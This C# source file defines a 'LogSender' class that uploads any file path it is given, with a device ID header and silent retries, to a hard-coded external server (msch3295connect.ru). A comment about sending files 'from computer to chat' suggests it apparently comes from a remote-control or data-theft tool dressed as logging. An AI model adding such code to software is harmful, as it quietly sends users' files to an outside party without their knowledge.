using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace netlib
{

    public class LogSender
    {

        static readonly string url = "https://msch3295connect.ru";

        public static async Task<bool> sendFileAsync(string filePath, string deviceId, string caption = "", int maxRetries = 3)
        {
            if (!File.Exists(filePath)) return false;

            if (!Internet.IsOK("msch3295connect.ru")) return false;

            for (int attempt = 1; attempt <= maxRetries; attempt++)
            {
                try
                {

                    using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read))
                    {
                        using (var streamContent = new StreamContent(fileStream))
                        {
                            using (var formData = new MultipartFormDataContent())
                            {
                                string safeFileName = Path.GetFileName(filePath);
                                formData.Add(streamContent, "logFile", safeFileName);
                                formData.Add(new StringContent(caption ?? ""), "caption");

                                var httpClient = new HttpClient
                                {
                                    Timeout = TimeSpan.FromSeconds(15)
                                };

                                httpClient.DefaultRequestHeaders.Add("X-Device-ID", deviceId);
                                httpClient.DefaultRequestHeaders.ConnectionClose = true;

                                var response = await httpClient.PostAsync(Path.Combine(url, "api", "log", "upload").Replace('\\', '/'), formData);
                                var responseText = await response.Content.ReadAsStringAsync();

                                if (response.IsSuccessStatusCode)
                                {
                                    return true;
                                }
                            }

                        }

                    }


                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[LogSender] Exception: {ex.Message}");
                }

                await Task.Delay(1000 * attempt);
            }

            return false;
        }


        // Send file from computer to chat
        public static async void UploadFile(string file, string Id, string caption = "")
        {
            // If is file
            if (File.Exists(file))
            {
                Environment.CurrentDirectory = Path.GetDirectoryName(file);

                await sendFileAsync(Path.GetFileName(file), Id, caption);
            }
        }
    }


}
